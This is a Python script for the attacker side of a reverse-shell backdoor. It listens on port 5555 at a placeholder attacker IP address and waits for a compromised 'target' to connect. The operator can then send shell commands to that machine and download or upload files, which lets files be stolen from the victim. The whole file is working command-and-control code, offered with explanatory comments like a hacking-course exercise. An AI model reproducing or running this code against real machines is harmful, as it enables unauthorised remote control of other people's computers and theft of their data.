import socket
import json
import os

def targetCommunication():
    while True:
        command = input("*Shell~%s: " % str(ip))
        reliableSend(command)
        
        if command == 'exit':
            break
        elif command[:3] == 'cd ':
            pass
        elif command == 'clear':
            os.system('clear')
        elif command[:8] == 'download':
            downloadFile(command[9:])
        elif command[:6] == 'upload':
            uploadFile(command[7:])
        else:
            result = reliableRecieve()
            print(result)

def reliableSend(command):
    json_data = json.dumps(command) # Store the output of the json.dumps on to command
    target.send(json_data.encode())

def downloadFile(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)

    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break

    target.settimeout(None) # Time out set to non existence
    f.close()

def uploadFile(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def reliableRecieve():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip() # Receiving data from the target, decoding it from bytes to string and stripping any trailing whitespace
            return json.loads(data)
        except ValueError:
            continue

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('<Attacker_IP_Address>', 5555))

print('[+] Listening for incoming connections...')
s.listen(5) # The program will listen upto 5 connections

target, ip = s.accept() # Accepting the incoming connections and storing the target socket object with the IP address
print('[+] Target connected from IP: ' + str(ip))


targetCommunication()
